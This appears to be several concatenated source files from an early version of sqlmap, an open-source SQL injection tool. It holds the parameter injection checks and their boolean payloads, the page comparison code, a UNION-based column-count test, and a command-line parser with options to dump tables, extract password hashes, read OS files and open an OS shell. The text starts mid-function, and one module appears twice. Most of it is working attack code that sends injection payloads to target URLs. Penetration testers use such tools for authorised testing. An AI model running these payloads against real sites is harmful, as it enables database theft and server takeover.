    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "unescaped numeric injectable"
    logger.info(infoMsg)

    infoMsg  = "testing single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringsingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likesingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringdouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "double quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likedouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE double quoted string injectable"
    logger.info(infoMsg)

    return None


def checkDynParam(place, parameter, value):
    """
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if True == dynResult1:
        return False

    infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "'%s" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, "\"%s" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = True != dynResult2
    condition |= True != dynResult3

    return condition


def checkStability():
    """
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """

    infoMsg = "testing if the url is stable, wait a few seconds"
    logger.info(infoMsg)

    firstPage, firstHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    secondPage, secondHeaders = Request.queryPage(content=True)
    time.sleep(0.5)                    

    thirdPage, thirdHeaders = Request.queryPage(content=True)                    

    condition  = firstPage == secondPage                    
    condition &= secondPage == thirdPage                    

    if condition == False:
        warnMsg  = "url is not stable, sqlmap will base the page "
        warnMsg += "comparison on a sequence matcher, if no dynamic nor "
        warnMsg += "injectable parameters are detected, refer to user's "
        warnMsg += "manual paragraph 'Page comparison' and provide a "
        warnMsg += "string or regular expression to match on"
        logger.warn(warnMsg)

    if condition == True:
        logMsg = "url is stable"
        logger.info(logMsg)

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("String") and
                  kb.resumedQueries[conf.url]["String"][:-1] == conf.string
                )

    if condition:
        return True

    infoMsg  = "testing if the provided string is within the "
    infoMsg += "target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = "you provided '%s' as the string to " % conf.string
        errMsg += "match, but such a string is not within the target "
        errMsg += "URL page content, please provide another string."
        logger.error(errMsg)

        return False


def checkRegexp():
    if not conf.regexp:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key("Regular expression") and
                  kb.resumedQueries[conf.url]["Regular expression"][:-1] == conf.regexp
                )

    if condition:
        return True

    infoMsg  = "testing if the provided regular expression matches within "
    infoMsg += "the target URL page content"
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if re.search(conf.regexp, page, re.I | re.M):
        setRegexp()
        return True
    else:
        errMsg  = "you provided '%s' as the regular expression to " % conf.regexp
        errMsg += "match, but such a regular expression does not have any "
        errMsg += "match within the target URL page content, please provide "
        errMsg += "another regular expression."
        logger.error(errMsg)

        return False


def checkConnection():
    infoMsg = "testing connection to the target url"
    logger.info(infoMsg)

    try:
        page, _ = Request.getPage()
        conf.seqMatcher.set_seq1(page)

    except sqlmapConnectionException, exceptionMsg:
        if conf.multipleTargets:
            exceptionMsg += ", skipping to next url"
            logger.warn(exceptionMsg)

            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser

from lib.core.data import logger
from lib.core.settings import VERSION_STRING


def cmdLineParser():
    """
    This function parses the command line parameters and arguments
    """

    usage = "%s [options]" % sys.argv[0]
    parser = OptionParser(usage=usage, version=VERSION_STRING)

    try:
        parser.add_option("-v", dest="verbose", type="int",
                          help="Verbosity level: 0-5 (default 1)")

        # Target options
        target = OptionGroup(parser, "Target", "At least one of these "
                             "options has to be specified to set the source "
                             "to get target urls from.")

        target.add_option("-u", "--url", dest="url", help="Target url")

        target.add_option("-l", dest="list", help="Parse targets from Burp "
                          "or WebScarab logs")

        target.add_option("-g", dest="googleDork",
                          help="Process Google dork results as target urls")

        target.add_option("-c", dest="configFile",
                          help="Load options from a configuration INI file")


        # Request options
        request = OptionGroup(parser, "Request", "These options can be used "
                              "to specify how to connect to the target url.")

        request.add_option("--method", dest="method", default="GET",
                           help="HTTP method, GET or POST (default: GET)")

        request.add_option("--data", dest="data",
                           help="Data string to be sent through POST")

        request.add_option("--cookie", dest="cookie",
                           help="HTTP Cookie header")

        request.add_option("--referer", dest="referer",
                           help="HTTP Referer header")

        request.add_option("--user-agent", dest="agent",
                           help="HTTP User-Agent header")

        request.add_option("-a", dest="userAgentsFile",
                           help="Load a random HTTP User-Agent "
                                "header from file")

        request.add_option("--headers", dest="headers",
                           help="Extra HTTP headers '\\n' separated")

        request.add_option("--auth-type", dest="aType",
                           help="HTTP Authentication type, value: "
                                "Basic or Digest")

        request.add_option("--auth-cred", dest="aCred",
                           help="HTTP Authentication credentials, value: "
                                "name:password")

        request.add_option("--proxy", dest="proxy",
                           help="Use a HTTP proxy to connect to the target url")

        request.add_option("--threads", dest="threads", type="int",
                           help="Maximum number of concurrent HTTP "
                                "requests (default 1)")

        request.add_option("--delay", dest="delay", type="float",
                           help="Delay in seconds between each HTTP request")

        request.add_option("--timeout", dest="timeout", type="float",
                           help="Seconds to wait before timeout connection "
                                "(default 30)")


        # Injection options
        injection = OptionGroup(parser, "Injection", "These options can be "
                                "used to specify which parameters to test "
                                "for, provide custom injection payloads and "
                                "how to parse and compare HTTP responses "
                                "page content when using the blind SQL "
                                "injection technique.")

        injection.add_option("-p", dest="testParameter",
                             help="Testable parameter(s)")

        injection.add_option("--dbms", dest="dbms",
                             help="Force back-end DBMS to this value")

        injection.add_option("--prefix", dest="prefix",
                             help="Injection payload prefix string")

        injection.add_option("--postfix", dest="postfix",
                             help="Injection payload postfix string")

        injection.add_option("--string", dest="string",
                             help="String to match in page when the "
                                  "query is valid")

        injection.add_option("--regexp", dest="regexp",
                             help="Regexp to match in page when the "
                                  "query is valid")

        injection.add_option("--excl-str", dest="eString",
                             help="String to be excluded before calculating "
                                  "page hash")

        injection.add_option("--excl-reg", dest="eRegexp",
                             help="Regexp matches to be excluded before "
                                  "calculating page hash")


        # Techniques options
        techniques = OptionGroup(parser, "Techniques", "These options can "
                                 "be used to test for specific SQL injection "
                                 "technique or to use one of them to exploit "
                                 "the affected parameter(s) rather than using "
                                 "the default blind SQL injection technique.")

        techniques.add_option("--stacked-test", dest="stackedTest",
                              action="store_true",
                              help="Test for stacked queries (multiple "
                                   "statements) support")

        techniques.add_option("--time-test", dest="timeTest",
                              action="store_true",
                              help="Test for Time based blind SQL injection")

        techniques.add_option("--union-test", dest="unionTest",
                              action="store_true",
                              help="Test for UNION query (inband) SQL injection")

        techniques.add_option("--union-use", dest="unionUse",
                              action="store_true",
                              help="Use the UNION query (inband) SQL injection "
                                   "to retrieve the queries output. No "
                                   "need to go blind")


        # Fingerprint options
        fingerprint = OptionGroup(parser, "Fingerprint")

        fingerprint.add_option("-f", "--fingerprint", dest="extensiveFp",
                               action="store_true",
                               help="Perform an extensive DBMS version fingerprint")


        # Enumeration options
        enumeration = OptionGroup(parser, "Enumeration", "These options can "
                                  "be used to enumerate the back-end database "
                                  "management system information, structure "
                                  "and data contained in the tables. Moreover "
                                  "you can run your own SQL SELECT queries.")

        enumeration.add_option("-b", "--banner", dest="getBanner",
                               action="store_true", help="Retrieve DBMS banner")

        enumeration.add_option("--current-user", dest="getCurrentUser",
                               action="store_true",
                               help="Retrieve DBMS current user")

        enumeration.add_option("--current-db", dest="getCurrentDb",
                               action="store_true",
                               help="Retrieve DBMS current database")

        enumeration.add_option("--is-dba", dest="isDba",
                               action="store_true",
                               help="Detect if the DBMS current user is DBA")

        enumeration.add_option("--users", dest="getUsers", action="store_true",
                               help="Enumerate DBMS users")

        enumeration.add_option("--passwords", dest="getPasswordHashes",
                               action="store_true",
                               help="Enumerate DBMS users password hashes (opt: -U)")

        enumeration.add_option("--privileges", dest="getPrivileges",
                               action="store_true",
                               help="Enumerate DBMS users privileges (opt: -U)")

        enumeration.add_option("--dbs", dest="getDbs", action="store_true",
                               help="Enumerate DBMS databases")

        enumeration.add_option("--tables", dest="getTables", action="store_true",
                               help="Enumerate DBMS database tables (opt: -D)")

        enumeration.add_option("--columns", dest="getColumns", action="store_true",
                               help="Enumerate DBMS database table columns "
                                    "(req:-T opt:-D)")

        enumeration.add_option("--dump", dest="dumpTable", action="store_true",
                               help="Dump DBMS database table entries "
                                    "(req: -T, opt: -D, -C, --start, --stop)")

        enumeration.add_option("--dump-all", dest="dumpAll", action="store_true",
                               help="Dump all DBMS databases tables entries")

        enumeration.add_option("-D", dest="db",
                               help="DBMS database to enumerate")

        enumeration.add_option("-T", dest="tbl",
                               help="DBMS database table to enumerate")

        enumeration.add_option("-C", dest="col",
                               help="DBMS database table column to enumerate")

        enumeration.add_option("-U", dest="user",
                               help="DBMS user to enumerate")

        enumeration.add_option("--exclude-sysdbs", dest="excludeSysDbs",
                               action="store_true",
                               help="Exclude DBMS system databases when "
                                    "enumerating tables")

        enumeration.add_option("--start", dest="limitStart", type="int",
                               help="First table entry to dump")

        enumeration.add_option("--stop", dest="limitStop", type="int",
                               help="Last table entry to dump")

        enumeration.add_option("--sql-query", dest="query",
                               help="SQL SELECT query to be executed")                    

        enumeration.add_option("--sql-shell", dest="sqlShell",
                               action="store_true",
                               help="Prompt for an interactive SQL shell")


        # File system options
        filesystem = OptionGroup(parser, "File system access", "These options "
                                 "can be used to access the back-end database "
                                 "management system file system taking "
                                 "advantage of native DBMS functions or "
                                 "specific DBMS design weaknesses.")

        filesystem.add_option("--read-file", dest="rFile",
                              help="Read a specific OS file content (only on MySQL)")

        filesystem.add_option("--write-file", dest="wFile",
                              help="Write to a specific OS file (not yet available)")


        # Takeover options
        takeover = OptionGroup(parser, "Operating system access", "This "
                               "option can be used to access the back-end "
                               "database management system operating "
                               "system taking advantage of specific DBMS "
                               "design weaknesses.")

        takeover.add_option("--os-shell", dest="osShell", action="store_true",
                            help="Prompt for an interactive OS shell "
                                 "(only on PHP/MySQL environment with a "
                                 "writable directory within the web "
                                 "server document root for the moment)")


        # Miscellaneous options
        miscellaneous = OptionGroup(parser, "Miscellaneous")

        miscellaneous.add_option("--eta", dest="eta", action="store_true",
                                 help="Retrieve each query output length and "
                                      "calculate the estimated time of arrival "
                                      "in real time")

        miscellaneous.add_option("--update", dest="updateAll", action="store_true",
                                help="Update sqlmap to the latest stable version")

        miscellaneous.add_option("-s", dest="sessionFile",
                                 help="Save and resume all data retrieved "
                                      "on a session file")

        miscellaneous.add_option("--save", dest="saveCmdline", action="store_true",
                                 help="Save options on a configuration INI file")

        miscellaneous.add_option("--batch", dest="batch", action="store_true",
                                 help="Never ask for user input, use the default behaviour")


        parser.add_option_group(target)
        parser.add_option_group(request)
        parser.add_option_group(injection)
        parser.add_option_group(techniques)
        parser.add_option_group(fingerprint)
        parser.add_option_group(enumeration)
        parser.add_option_group(filesystem)
        parser.add_option_group(takeover)
        parser.add_option_group(miscellaneous)

        (args, _) = parser.parse_args()

        if not args.url and not args.list and not args.googleDork and not args.configFile and not args.updateAll:
            errMsg  = "missing a mandatory parameter ('-u', '-l', '-g', '-c' or '--update'), "
            errMsg += "-h for help"
            parser.error(errMsg)

        return args
    except (OptionError, TypeError), e:
        parser.error(e)

    debugMsg = "parsing command line"
    logger.debug(debugMsg)

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.data import conf
from lib.core.settings import MATCH_RATIO


def comparison(page, headers=None, getSeqMatcher=False):
    regExpResults = None

    # String to be excluded before calculating page hash
    if conf.eString and conf.eString in page:
        index              = page.index(conf.eString)
        length             = len(conf.eString)
        pageWithoutString  = page[:index]
        pageWithoutString += page[index+length:]
        page               = pageWithoutString

    # Regular expression matches to be excluded before calculating page hash
    if conf.eRegexp:
        regExpResults = re.findall(conf.eRegexp, page, re.I | re.M)

        if regExpResults:
            for regExpResult in regExpResults:
                index              = page.index(regExpResult)
                length             = len(regExpResult)
                pageWithoutRegExp  = page[:index]
                pageWithoutRegExp += page[index+length:]
                page               = pageWithoutRegExp

    # String to match in page when the query is valid
    if conf.string:
        if conf.string in page:
            return True
        else:
            return False

    # Regular expression to match in page when the query is valid
    if conf.regexp:
        if re.search(conf.regexp, page, re.I | re.M):
            return True
        else:
            return False

    # By default it returns sequence matcher between the first untouched
    # HTTP response page content and this content
    conf.seqMatcher.set_seq2(page)

    if getSeqMatcher:
        return round(conf.seqMatcher.ratio(), 5)                    

    elif round(conf.seqMatcher.ratio(), 5) >= MATCH_RATIO:                    
        return True

    else:
        return False

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __effectiveUnionTest(query, comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    resultDict = {}

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:                    
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload = agent.payload(newValue=commentedQuery)
        newResult = Request.queryPage(payload)                    

        if not newResult in resultDict.keys():
            resultDict[newResult] = (1, commentedQuery)
        else:
            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)

        if count:                    
            for element in resultDict.values():                    
                if element[0] == 1:                    
                    if kb.injPlace == "GET":
                        value = "%s?%s" % (conf.url, payload)                    
                    elif kb.injPlace == "POST":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nPOST:\t'%s'\n" % payload                    
                    elif kb.injPlace == "Cookie":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nCookie:\t'%s'\n" % payload                    
                    elif kb.injPlace == "User-Agent":
                        value  = "URL:\t\t'%s'" % conf.url
                        value += "\nUser-Agent:\t'%s'\n" % payload                    

                    return value

    return None


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    value = ""

    query = agent.prefixQuery(" UNION ALL SELECT NULL")

    for comment in (queries[kb.dbms].comment, ""):
        value = __effectiveUnionTest(query, comment)

        if value:
            setUnion(comment, value.count("NULL"))

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value

#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re
import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.core.session import setRegexp
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """

    randInt = randomInt()
    randStr = randomStr()

    if conf.prefix or conf.postfix:
        prefix  = ""
        postfix = ""

        if conf.prefix:
            prefix = conf.prefix

        if conf.postfix:
            postfix = conf.postfix

        infoMsg  = "testing custom injection "
        infoMsg += "on %s parameter '%s'" % (place, parameter)
        logger.info(infoMsg)

        payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt, postfix))
        trueResult = Request.queryPage(payload, place)

        if trueResult == True:
            payload = agent.payload(place, parameter, value, "%s%s%s AND %s%d=%d %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1, postfix))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "confirming custom injection "
                infoMsg += "on %s parameter '%s'" % (place, parameter)
                logger.info(infoMsg)

                payload = agent.payload(place, parameter, value, "%s%s%s AND %s%s %s" % (value, prefix, ")" * parenthesis, "(" * parenthesis, randStr, postfix))
                falseResult = Request.queryPage(payload, place)

                if falseResult != True:
                    infoMsg  = "%s parameter '%s' is " % (place, parameter)
                    infoMsg += "custom injectable "
                    logger.info(infoMsg)

                    return "custom"

    infoMsg  = "testing unescaped numeric injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s%s AND %s%d=%d" % (value, ")" * parenthesis, "(" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming unescaped numeric injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "unescaped numeric injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "numeric"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "unescaped numeric injectable"
    logger.info(infoMsg)

    infoMsg  = "testing single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s'='%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringsingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE single quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s'%s AND %s'%s' LIKE '%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE single quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s'%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE single quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likesingle"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "LIKE single quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\"=\"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s AND %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "stringdouble"

    infoMsg  = "%s parameter '%s' is not " % (place, parameter)
    infoMsg += "double quoted string injectable"
    logger.info(infoMsg)

    infoMsg  = "testing LIKE double quoted string injection "
    infoMsg += "on %s parameter '%s'" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, "%s\"%s AND %s\"%s\" LIKE \"%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = "confirming LIKE double quoted string injection "
            infoMsg += "on %s parameter '%s'" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, "%s\"%s and %s%s" % (value, ")" * parenthesis, "(" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = "%s parameter '%s' is " % (place, parameter)
                infoMsg += "LIKE double quoted string injectable "
                infoMsg += "with %d parenthesis" % parenthesis
                logger.info(infoMsg)

                return "likedouble"

